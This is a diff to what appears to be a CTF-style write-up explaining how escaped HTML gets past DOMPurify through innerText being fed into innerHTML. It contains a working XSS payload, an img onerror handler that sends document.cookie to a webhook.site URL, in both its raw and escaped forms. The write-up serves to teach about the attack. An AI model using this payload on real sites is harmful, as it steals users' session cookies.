@@ -77,7 +77,7 @@ inside the anchor tag and paste it inside a <code>span</code> element with inner
 We can't just define the malicious HTML inside the anchor tag for two reasons: the innerText only refers to the text and the HTML defined inside the nutshell parameter is
 purified by DOM Purify from the page itself. We should define text that can be interpreted as HTML, but isn't HTML. How? Obfuscation!
 To trigger an XSS, a code like this: <code>\</span\>\<img src onerror='fetch("https://webhook.site/a2e16dd2-9690-4246-8c58-abf303c42a4b/? cookie= "+document.cookie)'/\>\<span\></code> should be written like this:
-<code>\&lt;/span\&gt;\&lt;img src onerror='fetch("<span>https://webhook.site/a2e16dd2-9690-4246-8c58-abf303c42a4b/?cookie=</span> "+document.cookie)'/\&gt;\&lt;span\&gt;</code>. So:
+<code>\&lt;/span\&gt;\&lt;img src onerror='fetch("<span>https://webhook.site/a2e16dd2-9690-4246-8c58-abf303c42a4b/?cookie=</span> "+document.cookie)'/\&gt;\&lt;span\&gt;</code>. It works because the innerText property decodes the escaped HTML into real HTML and from this output a string containing valid HTML is then obtained, which is then inserted into innerHTML. So:
 ```HTML
 <HTML>
 <body>
